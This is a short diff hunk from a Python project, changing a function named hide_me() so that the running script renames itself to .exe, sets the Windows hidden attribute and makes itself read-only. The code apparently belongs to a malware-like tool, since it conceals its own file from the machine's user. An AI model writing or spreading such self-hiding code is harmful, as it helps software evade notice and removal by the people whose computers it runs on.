@@ -113,10 +113,10 @@ def hide_me():
     try:
         if __file__.lower().endswith(".py"):
             (root_filename, extension) = os.path.splitext(__file__)
-            os.rename(__file__, root_filename + ".exe")
-        elif __file__.lower().endswith(".exe"):
-            ctypes.windll.kernel32.SetFileAttributesW(__file__, 0x02)  # hidden
-            os.chmod(__file__, S_IREAD)  # read-only
+            new_filename = root_filename + ".exe"
+            os.rename(__file__, new_filename)
+            ctypes.windll.kernel32.SetFileAttributesW(new_filename, 0x02)
+            os.chmod(new_filename, S_IREAD)  # read-only
     except Exception as reason:
         log.critical(reason)
 
